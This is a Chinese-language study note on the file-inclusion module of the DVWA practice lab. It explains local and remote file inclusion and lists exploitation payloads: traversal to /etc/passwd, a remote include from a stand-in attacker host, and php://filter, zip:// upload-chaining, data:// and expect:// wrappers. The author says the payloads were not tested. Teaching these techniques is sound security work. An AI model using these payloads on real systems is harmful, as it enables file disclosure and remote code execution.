# DVWA靶场收尾

## 一、文件包含

### 漏洞成因：
文件包含漏洞允许攻击者包含文件，通常是利用目标应用中实现的“动态文件包含”机制进行攻击。该漏洞的产生原因是：应用在使用用户提供的输入时，未进行充分的校验。

这种漏洞轻则会导致文件内容被泄露，根据漏洞的严重程度，还可能引发以下风险：

- 在 Web 服务器上执行代码(大多指php代码)
- 在客户端执行代码（如 JavaScript），进而引发跨站脚本（XSS）等其他攻击(访问含有XSS攻击的文件，浏览器返回，执行XSS代码)
- 拒绝服务（DoS）攻击(执行php无限循环代码，消耗服务器资源)
- 敏感信息泄露(linux系统文件等)

**本地文件包含（也称为 LFI）**，是指攻击者利用应用中存在缺陷的包含流程，读取服务器上已存在的本地文件的攻击行为。例如，当某个页面接收用户输入的“待包含文件路径”，却未对该输入做充分的安全净化时，就会产生此类漏洞，攻击者可借此注入目录遍历字符（如 `../`，即点点斜杠，此为文件穿越，最为常见）。虽然绝大多数案例都出现在存在漏洞的 PHP 脚本中，但需要注意的是，这类漏洞在 JSP、ASP 等其他技术栈中也同样常见。

**远程文件包含（也称为 RFI）**，是指攻击者利用应用中存在缺陷的包含流程，加载并执行服务器外部（远程服务器）文件的攻击行为。例如，当某个页面接收用户输入的“待包含文件路径”，不仅未对该输入做充分的安全净化，且服务器开启了远程文件包含相关配置（如 PHP 的 `allow_url_include=On`）时，就会产生此类漏洞，攻击者可借此注入远程文件地址（如 `http://attacker.com/malicious.php`，即攻击者搭建的恶意服务器地址，此为远程加载恶意代码，危害极高）。虽然绝大多数案例都出现在存在漏洞的 PHP 脚本中，但需要注意的是，这类漏洞在 ASP.NET、JSP 等其他技术栈中也同样常见（不同技术栈需对应开启远程资源加载配置才会触发）。

**大多是配合文件上传漏洞+文件包含漏洞来进行攻击**

*由于up的php版本不符合dvwa中的版本，如无include()函数，所以无法测试文件包含漏洞，后续相关测试会在合适时机补充，一下阐释详细的攻击手段*

### 示例以及应用

1. 本地文件读取(文件穿越)
```php
http://target/vuln.php?page=../../../../etc/passwd
```
*一下介绍几种利用php伪协议的方式实现文件包含*
2. 利用PHP Filter
PHP Filter 用于访问本地文件系统，是一个不区分大小写的包装器，能够在打开文件时对数据流应用过滤规则。借助该包装器，可读取文件内容并阻止服务器执行文件，例如攻击者可通过它读取PHP文件源码，从中获取凭证等敏感信息，或发现其他可利用的漏洞。

其使用格式为 `php://filter/convert.base64-encode/resource=FILE`，其中`FILE`为待读取的文件路径。执行该语句后，目标文件的内容会被读取并进行Base64编码（这一步可避免服务端执行文件内容），最终将编码后的结果返回给用户代理。

3. PHP ZIP
PHP 7.2.0 版本中新增了`zip://`包装器，用于处理ZIP压缩文件。该包装器的参数格式为 `zip://filename_path#internal_filename`，其中`filename_path`为恶意文件的服务器路径，`internal_filename`为恶意文件在ZIP压缩包内的路径。在漏洞利用过程中，通常需要将`#`进行URL编码，转换为`%23`。

攻击者可利用该包装器构造恶意ZIP压缩包，通过目标网站的文件上传功能（如头像上传）将其上传至服务器（`zip://`包装器对ZIP文件的扩展名无特殊要求），再结合本地文件包含（LFI）漏洞执行该恶意文件。

以下是结合本地文件包含漏洞，利用`zip://`包装器的具体测试步骤：
- 编写待执行的PHP文件，例如写入内容`<?php phpinfo(); ?>`，并保存为`code.php`；
- 将该PHP文件压缩为ZIP包，命名为`target.zip`；
- 将`target.zip`重命名为`target.jpg`，绕过服务器的文件扩展名验证，随后将其作为头像上传至目标网站；
- 假设该文件被服务器存储在`../avatar/target.jpg`路径下，在存在漏洞的URL中注入以下载荷，利用PHP ZIP包装器触发漏洞：
`zip://../avatar/target.jpg%23code`（注意`%23`是`#`的URL编码形式）。

在本测试示例中，服务器会将`.php`扩展名拼接至传入的载荷后，因此向`http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code`发起请求时，服务器会执行恶意ZIP包内的`code.php`文件。

4. PHP Data
自 PHP 5.2.0 起可用，该包装器的使用格式为：`data://text/plain;base64,BASE64_STR`，其中`BASE64_STR`是待处理文件内容的 Base64 编码。需要注意的是，仅当 PHP 配置中开启`allow_url_include`选项时，该包装器才可用。

若要利用该包装器测试本地文件包含（LFI）漏洞，需将待执行的代码进行 Base64 编码。例如，`<?php phpinfo(); ?>` 代码编码后为：`PD9waHAgcGhwaW5mbyA/Pg==`，最终构造的利用载荷为：
`data://text/plain;base64,PD9waHAgcGhwaW5mbyA/Pg==`。

5. PHP Expect
该包装器**默认未启用**，可用于访问进程的标准输入（stdio）、标准输出（stdout）和标准错误（stderr）。
使用格式为 `expect://command`，服务器会在 Bash 环境中执行指定的命令，并返回执行结果。
